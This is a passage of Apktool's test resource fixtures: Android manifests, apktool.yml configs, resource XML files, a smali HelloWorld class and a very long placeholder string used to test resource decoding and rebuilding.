<?xml version="1.0" encoding="utf-8"?>
<manifest package="com.ibotpeaches.issue2328" xmlns:android="http://schemas.android.com/apk/res/android" platformBuildVersionCode="20" platformBuildVersionName="4.4W.2-1537038">
<application/>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/issue2328/debuggable-missing/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue2328.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
packageInfo:
  forcedPackageId: '127'
versionInfo:
  versionCode: '1'
  versionName: '1.0'
compressionType: false
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/issue2328/debuggable-missing/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/issue2328/debuggable-true/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest package="com.ibotpeaches.issue2328" xmlns:android="http://schemas.android.com/apk/res/android" platformBuildVersionCode="20" platformBuildVersionName="4.4W.2-1537038">
<application android:debuggable="true"/>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/issue2328/debuggable-true/apktool.yml`:

```yml
version: 2.0.0
apkFileName: issue2328.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
packageInfo:
  forcedPackageId: '127'
versionInfo:
  versionCode: '1'
  versionName: '1.0'
compressionType: false
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/issue2328/debuggable-true/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/network_config/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415" package="brut.apktool.testapp" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
    <application>
        android:networkSecurityConfig="@xml/network_security_config"
    </application>
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/network_config/apktool.yml`:

```yml
version: 2.0.0
apkFileName: testapp.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
versionInfo:
  versionCode: '1'
  versionName: '1.0'

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/network_config/res/values/public.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <public type="string" name="hello_world" id="0x7f020000" />
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/network_config/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="hello_world">Hello World</string>
</resources>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/network_config/res/xml/network_security_config.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">example.com</domain>
        <pin-set>
            <pin digest="SHA-256">OEJax6JVAMiUP7wzOiLPU7KW38Cdx3afNZOYR2iOFZ4=</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/network_config/smali/HelloWorld.smali`:

```smali
.class public LHelloWorld;

.super Ljava/lang/Object;

.method public static main([Ljava/lang/String;)V
    .registers 2

    sget-object v0, Ljava/lang/System;->out:Ljava/io/PrintStream;

    const/high16 v1, 0x7f020000

    invoke-virtual {v0, v1}, Ljava/io/PrintStream;->println(Ljava/lang/String;)V

    return-void
.end method
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/pkgid8/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415" package="brut.apktool.aapt2.pkgid8" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415" featureName="feature">
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/pkgid8/apktool.yml`:

```yml
version: 2.0.0
apkFileName: pkgid8.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
packageInfo:
  forcedPackageId: '128'
versionInfo:
  versionCode: '1'
  versionName: '1.0'
compressionType: false
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/pkgid8/res/values/integers.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <integer name="foo3">117</integer>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/pkgid8/res/values/public.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <public type="string" name="foo1" id="0x80020000" />
    <public type="string" name="foo2" id="0x80020001" />
    <public type="integer" name="foo3" id="0x80030000" />
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/pkgid8/res/values/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="foo1">foo</string>
    <string name="foo2">bar</string>
</resources>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/AndroidManifest.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<manifest xmlns:android="http://schemas.android.com/apk/res/android" android:appCategory="game" android:compileSdkVersion="23" android:compileSdkVersionCodename="6.0-2438415" package="brut.apktool.aapt1.testapp" platformBuildVersionCode="23" platformBuildVersionName="6.0-2438415">
    <application android:label="Issue2799 &amp; B">
        <meta-data name="test_int_as_string" value="\ 12345" />
        <meta-data name="test_int" value="12345" />
    </application>
    <uses-permission android:name="android.permission.BLUETOOTH_SCAN" android:usesPermissionFlags="neverForLocation" />
</manifest>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/apktool.yml`:

```yml
version: 2.3.2
apkFileName: testapp.apk
isFrameworkApk: false
usesFramework:
  ids:
  - 1
packageInfo:
  forcedPackageId: '127'
versionInfo:
  versionCode: '1'
  versionName: '1.0'
compressionType: false
doNotCompress:
- assets/0byte_file.jpg
sparseResources: false
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/drawable/$avd_hide_password__0.xml`:

```xml
<vector xmlns:android="http://schemas.android.com/apk/res/android"></vector>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/drawable/$avd_show_password__0.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<vector android:height="24.0dip" android:width="24.0dip" android:viewportWidth="24.0" android:viewportHeight="24.0"
        xmlns:android="http://schemas.android.com/apk/res/android" xmlns:aapt="http://schemas.android.com/aapt">
</vector>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/drawable/$avd_show_password__1.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<objectAnimator android:interpolator="@android:interpolator/fast_out_linear_in" android:valueType="pathType" android:propertyName="pathData"
                xmlns:android="http://schemas.android.com/apk/res/android" xmlns:aapt="http://schemas.android.com/aapt" />
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/drawable/$avd_show_password__2.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<objectAnimator android:interpolator="@android:interpolator/fast_out_linear_in" android:valueFrom="1" android:valueTo="0" android:propertyName="trimPathEnd"
                xmlns:android="http://schemas.android.com/apk/res/android" xmlns:aapt="http://schemas.android.com/aapt" />
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/drawable/avd_show_password.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<animated-vector android:drawable="@drawable/$avd_show_password__0"
                 xmlns:android="http://schemas.android.com/apk/res/android" xmlns:aapt="http://schemas.android.com/aapt">
    <target android:name="eye_mask" android:animation="@drawable/$avd_show_password__1" />
    <target android:name="strike_through" android:animation="@drawable/$avd_show_password__2" />
</animated-vector>
```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/navigation/nav_graph.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<navigation xmlns:android="http://schemas.android.com/apk/res/android">
</navigation>

```

`brut.apktool/apktool-lib/src/test/resources/aapt2/testapp/res/values-es/strings.xml`:

```xml
<?xml version="1.0" encoding="utf-8"?>
<resources>
    <string name="long_string_32767">aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa